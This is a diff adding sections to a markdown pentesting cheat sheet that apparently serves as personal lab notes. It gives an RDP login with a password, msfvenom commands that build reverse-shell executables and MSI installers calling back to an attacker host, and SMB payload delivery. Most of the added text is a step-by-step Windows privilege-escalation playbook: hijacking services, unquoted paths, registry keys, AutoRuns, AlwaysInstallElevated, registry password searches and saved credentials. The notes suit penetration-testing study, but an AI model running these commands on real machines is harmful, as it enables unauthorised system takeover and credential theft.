@@ -461,12 +461,71 @@ Output file contents:
 ## Netstat
 - list all tcp connections: `netstat -at | less`
 - also useful: `netstat -tulpn`
+
+## RDP
+- connect via RDP: `xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.225.187`
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Windows
 - possible stored credentials: `C:\Program Files\FileZilla Server\FileZilla Server.xml`
 - `C:\xampp\FileZilla Server\FileZilla Server.xml`
 - add own account: `net user <username> <password> /add`
 - add account to admin group: `net localgroup administrators <username> /add`
+
+## Windows Privesc
+
+### Generate reverse shell
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
+- start SMB server: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+- download in Windows PC: `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
+- start listener and execute shell with: `C:\PrivEsc\reverse.exe`
+
+### Insecure Service Permissions
+- Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
+- query the serivce: `sc qc daclsvc` (runs as system)
+- change the binpath: `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
+- run shell as system: `net start daclsvc`
+
+### Unquoted service
+- check if unquoted service runs as SYSTEM: `sc qc unquotedsvc`
+- check who is allowed to write to the service path: `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" `
+- cope the shell and rename: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
+- run service: `net start unquotedsvc`
+
+### Weak registry permissions
+- query registry service to see if it runs as system: `sc qc regsvc`
+- check who is able to write the registry entry: `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
+- overwrite ImagePath registry key to reverse shell: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
+- start service: `net start regsvc`
+
+### Insecure service executables
+- `sc qc filepermsvc`
+- check who can write binary path name: `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
+- replace service with reverse shell: `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
+- `net start filepermsvc`
+
+### Registry - AutoRuns
+- query the registry for AutoRun executables: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+- check who can write executable: `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
+- copy reverse shell to executable: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
+- make sure the executable runs
+
+### Registry - AlwaysInstallElevated keys
+- Query the registry for AlwaysInstallElevated keys: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+- or: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+- `0x1` means installers run with elevated privileges
+- generate reverse shell installer: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
+- run installer: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
+
+### Registry - Passwords
+- search registry for keys with the name 'password': `reg query HKLM /f password /t REG_SZ /s`
+- query one of the found keys: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
+- spawn command prompt with found credentials: `winexe -U 'admin%password' //10.10.193.40 cmd.exe`
+
+### Passwords - Saved Creds
+- list saved creds: `cmdkey /list`
+- run as user with saved creds: `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 # OSINT
 
